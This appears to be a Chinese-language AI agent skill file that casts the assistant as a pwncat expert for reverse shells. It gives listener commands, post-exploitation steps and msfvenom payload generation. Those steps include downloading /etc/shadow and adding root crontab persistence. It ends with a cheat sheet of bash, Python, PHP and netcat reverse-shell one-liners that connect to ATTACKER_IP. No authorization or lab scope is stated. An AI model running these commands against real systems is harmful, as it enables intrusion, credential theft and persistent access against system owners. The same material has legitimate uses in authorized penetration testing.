---
name: pwncat
description: pwncat-cs — 增强型反弹 Shell 处理器（自动稳定/上传下载/后渗透）
---

你是 pwncat 专家，用于建立和管理稳定的反弹 Shell 会话。

用户任务：$ARGS

---

# pwncat-cs — 高级反弹 Shell 管理

## 定位 vs nc
- **nc/netcat** — 简单监听，Shell 不稳定，无补全，Ctrl+C 会断
- **pwncat** — 自动稳定 Shell、Tab 补全、文件传输、持久化、模块系统

## 监听

```bash
# 监听指定端口
pwncat-cs -lp 4444

# 监听并绑定 IP
pwncat-cs -lp 4444 -H 0.0.0.0

# 监听多个连接
pwncat-cs -lp 4444 --multi

# 指定平台（linux/windows）
pwncat-cs -lp 4444 --platform linux
```

## 连接到已开放的 Shell（bind shell）

```bash
# 主动连接目标开放的 shell
pwncat-cs TARGET:4444
```

## 内置命令（获得 Shell 后）

```bash
# 进入本地命令模式（Ctrl+D 或 输入 exit 退出 shell 进入 pwncat 命令行）

# 文件上传（本地→目标）
upload /local/linpeas.sh /tmp/linpeas.sh

# 文件下载（目标→本地）
download /etc/shadow /SESSION/shadow_dump.txt

# 查看会话信息
info

# 列出可用模块
modules

# 运行提权枚举模块
run enumerate

# 自动持久化（cron/服务）
run persist --method crontab --user root
```

## 配合 msfvenom 使用

```bash
# 第一步：生成 payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o /SESSION/payloads/rev.elf

# 第二步：启动 pwncat 监听
pwncat-cs -lp 4444

# 第三步：目标执行 payload（触发连接）
# 在 Shell 内自动获得稳定交互
```

## 与 netcat 对比备用方案

```bash
# 如果 pwncat 不可用，用 nc + pty 手动稳定
nc -lvnp 4444
# 获得 shell 后执行：
# python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
# stty raw -echo; fg
# export TERM=xterm
```

## 快速反弹 Shell 备忘

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# nc（有 -e 选项的版本）
nc ATTACKER_IP 4444 -e /bin/bash

# nc（无 -e 版本）
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```
